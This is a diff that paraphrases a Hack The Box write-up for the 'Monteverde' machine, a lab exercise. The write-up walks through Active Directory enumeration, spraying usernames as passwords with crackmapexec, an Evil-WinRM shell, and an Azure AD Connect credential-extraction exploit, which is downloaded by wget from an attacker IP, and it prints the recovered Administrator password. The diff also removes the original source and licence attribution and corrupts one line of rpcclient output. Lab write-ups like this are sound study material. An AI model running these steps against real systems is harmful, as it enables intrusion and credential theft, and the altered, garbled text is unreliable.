@@ -6,9 +6,9 @@ points: 30
 rating: 4.4
 date: 2020-01-11
 avatar: assets/htb/monteverde.png
-source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Monteverde
 ---
+
 ## 
 Useful Skills and Tools
 
@@ -53,7 +53,7 @@ Enumeration
 ### 
 Nmap scan
 
-I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all TCP ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the nmap output with a filename of `<name>`.
+I kicked things off by running nmap against `<YOUR_IP>`. My usual flag set: `-p-` tells nmap to cover every TCP port, `-sC` is shorthand for `--script=default` and fires the default enumeration scripts at the host, `-sV` performs service/version detection, and `-oN <name>` writes the results to a file called `<name>`.
 
 ```text
 kac0@kalimaa:~/htb/monteverde$ nmap -p- -sC -sV -oN monteverde.nmap <YOUR_IP>
@@ -62,7 +62,7 @@ Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-24 10:42 EDT
 Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
 ```
 
-At first my scan wouldn't go through until I added the `-Pn` flag to stop nmap from sending ICMP probes. After that it proceeded normally.  This behavior seems to be more common on Windows machines, as I also encountered this on `Nest` and `Oouch`. 
+The scan initially refused to run until I tacked on `-Pn`, which suppresses nmap's ICMP ping probes. With that in place it ran fine.  This is something I tend to see more often on Windows targets, having hit the same thing on `Nest` and `Oouch`. 
 
 ```text
 kac0@kalimaa:~/htb/monteverde$ nmap -p- -sC -sV -Pn -oN monteverde.nmap <YOUR_IP>
@@ -126,11 +126,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Thu May 28 13:55:16 2020 -- 1 IP address (1 host up) scanned in 738.00 seconds
 ```
 
-From these results I could see a lot of open ports! Since ports `88 - kerberos`, `135 & 139 - Remote Procedure Call`, `389 & 3268 - LDAP`, and `445 - SMB` were all open it was safe to assume that this box was running Active Directory on a Windows machine. 
+The output revealed plenty of open ports! With `88 - kerberos`, `135 & 139 - Remote Procedure Call`, `389 & 3268 - LDAP`, and `445 - SMB` all listening, it was a fair bet that this host was a Windows box running Active Directory. 
 
 ### ldapsearch
 
-Since I had so many options, I decided to start by enumerating Active Directory through LDAP using `ldapsearch`. This command is built into many linux distros and returned a wealth of information. I snipped out huge chunks of the output in order to reduce information overload as most of it was not particularly interesting in this case. _Warning! The output from `ldapsearch` can be quite extensive, so be prepared to wade through a lot of data till you find anything useful.  I have snipped out the irrelevant sections below._
+With so many avenues available, I chose to begin by querying Active Directory over LDAP with `ldapsearch`. The tool ships with many linux distributions and gave back a ton of data. I trimmed large portions of it to cut down on noise, since most was uninteresting here. _Heads up: `ldapsearch` can spit out an enormous amount of text, so expect to sift through plenty of it before finding anything worthwhile.  The irrelevant parts are removed below._
 
 ```text
 kac0@kalimaa:~/htb/monteverde$ ldapsearch -H ldap://<YOUR_IP>:3268 -x -LLL -s base -b "DC=megabank,DC=local"
@@ -220,7 +220,7 @@ dSCorePropagationData: 20200103123551.0Z
 dSCorePropagationData: 16010101000001.0Z
 ```
 
-The user `mhope` seems like a good target.  He is a member of both the `Remote Management Users` and `Azure Admins` groups, which should be good for getting into the machine and escalating our privileges.
+`mhope` stands out as a promising account.  He belongs to both `Remote Management Users` and `Azure Admins`, which should help with both landing on the box and later climbing privileges.
 
 ```text
 dn: CN=SABatchJobs,OU=Service Accounts,DC=MEGABANK,DC=LOCAL
@@ -482,7 +482,7 @@ dSCorePropagationData: 16010101000000.0Z
 
 ### rpcclient
 
-Next I used `rpcclient` to validate the information I found through LDAP using the following RPC commands:  `enumdomusers` - enumerate domain users, `queryuser <RID -or- last 4 of SID>` - get details about a specific user, `enumalsgroups builtin` - list all available built-in groups , and `queryaliasmem builtin <RID>` - to get the SIDs of the members of a specific built-in group.
+Next I turned to `rpcclient` to confirm what LDAP had shown me, using these RPC commands:  `enumdomusers` - list domain users, `queryuser <RID -or- last 4 of SID>` - pull details on a given user, `enumalsgroups builtin` - show the built-in groups, and `queryaliasmem builtin <RID>` - return the SIDs of a built-in group's members.
 
 ```text
 kac0@kalimaa:~/htb/monteverde$ rpcclient -U "" -N <YOUR_IP>
@@ -490,7 +490,7 @@ kac0@kalimaa:~/htb/monteverde$ rpcclient -U "" -N <YOUR_IP>
 rpcclient $> enumdomusers
 user:[Guest] rid:[0x1f5]
 user:[AAD_987d7f2f57d2] rid:[0x450]
-user:[mhope] rid:[0x641]
+user:hope] rid:[0x641]
 user:[SABatchJobs] rid:[0xa2a]
 user:[svc-ata] rid:[0xa2b]
 user:[svc-bexec] rid:[0xa2c]
@@ -557,7 +557,7 @@ rpcclient $> queryuser 1601
 
 ### Interesting users/groups found
 
-There was no interesting information in the other users other than the business divisions they worked in, but I made a list of their usernames, just in case. So far the users and groups I found were:
+The remaining accounts revealed nothing notable beyond the business units they belonged to, but I jotted down their usernames anyway. The users and groups I had gathered so far were:
 
 * AAD\_987d7f2f57d2
   * a member of the `Azure Admins` group
@@ -574,7 +574,7 @@ There was no interesting information in the other users other than the business 
 * smorgan
   * a member the `Operations` group
 
-I was not able to login as the most promising user, `mhope`, without a password, so I still had to figure out which user would give me a foothold on the machine.   With no credentials found anywhere, I decided to try a different tactic.  Perhaps someone had been lazy and used their username as their password.  To test for this, I created a list of usernames and used this to try to login to SMB using a tool called `crackmapexec.` I tried each username combination until one worked. Apparently we had a lazy administrator who had created the `SABatchJobs` service account using the username as the password.
+Logging in as my top pick, `mhope`, was a no-go without a password, so I still needed to work out which account could get me onto the box.   Having found no credentials anywhere, I switched approaches.  Maybe someone had been careless and reused their username as their password.  To check, I built a username list and fed it to `crackmapexec` against SMB, trying every combination until one stuck. Sure enough, a lazy admin had set up the `SABatchJobs` service account with its username doubling as the password.
 
 ```text
 kac0@kalimaa:~/htb/monteverde$ crackmapexec smb <YOUR_IP> -u users.txt -p users.txt
@@ -701,7 +701,7 @@ Revision=1
 MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=4,1
 ```
 
-...password policy...other than that nothing at all useful...
+...just the password policy...nothing else of any value here...
 
 ```text
 kac0@kalimaa:~/htb/monteverde$ smbclient -W MEGABANK \\\\<YOUR_IP>\\azure_uploads -U SABatchJobs
@@ -710,7 +710,7 @@ Try "help" to get a list of possible commands.
 smb: \>
 ```
 
-...again nothing...
+...once more, empty...
 
 ## Road to User
 
@@ -738,7 +738,7 @@ smb: \mhope\> get azure.xml
 getting file \mhope\azure.xml of size 1212 as azure.xml (1.8 KiloBytes/sec) (average 1.8 KiloBytes/sec)
 ```
 
-...`mhope` folder contained `azure.xml`...
+...the `mhope` folder held `azure.xml`...
 
 ### Finding user credentials
 
@@ -760,7 +760,7 @@ getting file \mhope\azure.xml of size 1212 as azure.xml (1.8 KiloBytes/sec) (ave
 </Objs>
 ```
 
-...we have a password for \`mhope\`!...since mhope was a member of the `Remote Management Users` group...`Evil-WinRM` is a great tool to gain access...
+...there's a password for \`mhope\`!...and because mhope sits in the `Remote Management Users` group...`Evil-WinRM` is an excellent way to get a shell...
 
 ```text
 kac0@kalimaa:~/htb/monteverde$ evil-winrm -i <YOUR_IP> -u mhope 
@@ -823,7 +823,7 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 
 ### Enumeration as User - mhope
 
-...`Azure Admins` group sounds interesting!...
+...that `Azure Admins` group looks worth digging into!...
 
 ```text
 *Evil-WinRM* PS C:\Users\mhope\Documents> cd ..
@@ -955,13 +955,13 @@ TokenCache.dat MEGABANK\mhope NT AUTHORITY\SYSTEM Allow  FullControl
 }
 ```
 
-searching for a way to exploit this led to [https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/](https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/) which led to this powershell POC [https://blog.xpnsec.com/azuread-connect-for-redteam/](https://blog.xpnsec.com/azuread-connect-for-redteam/)
+looking for a way to weaponize this brought me to [https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/](https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/) which in turn pointed at this PowerShell POC [https://blog.xpnsec.com/azuread-connect-for-redteam/](https://blog.xpnsec.com/azuread-connect-for-redteam/)
 
 ### Privilege Escalation
 
-had to edit the script to get it to work. \(sorry...I didnt write down who or where I found the fix for this script originally, it was simply in my notes with no explanation.\)
+I needed to tweak the script before it would run. \(apologies...I never noted who or where the fix came from originally; it was just sitting in my notes with no context.\)
 
-The client code at the beginning had to be edited to read:
+The client connection code near the top had to be changed to:
 
 ```text
 $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=LocalHost;Database=ADSync;Trusted_Connection=True;"
@@ -994,7 +994,7 @@ Headers           : {[Content-Length, 1741], [Content-Type, application/octet-st
 RawContentLength  : 1741
 ```
 
-Apparently this will retrieve the file, but not actually save it to disk unless you add `-Outfile <filename>`
+It turns out this fetches the file but won't write it to disk unless you also pass `-Outfile <filename>`
 
 ```text
 *Evil-WinRM* PS C:\Users\mhope\documents> wget http://10.10.14.253:8099/AzCreds.ps1 -UseBasicParsing -Outfile AzCreds.ps1
@@ -1002,7 +1002,7 @@ Apparently this will retrieve the file, but not actually save it to disk unless 
 
 ### Getting the Administrator credentials
 
-Now that my exploit had been successfully transferred to the target, I was able to run it and extract the `Administrator` password from Azure Connect.  
+With the exploit now on the target, I could execute it and pull the `Administrator` password out of Azure Connect.  
 
 ```text
 *Evil-WinRM* PS C:\Users\mhope\Documents> ./AzCreds.ps1
@@ -1016,7 +1016,7 @@ Password: d0m@in4dminyeah!
 
 ### root.txt
 
-With the `Administrator` password in hand, it was simple to login using `evil-winrm` and to collect the root flag.
+Holding the `Administrator` password, logging in via `evil-winrm` and grabbing the root flag was trivial.
 
 ```text
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
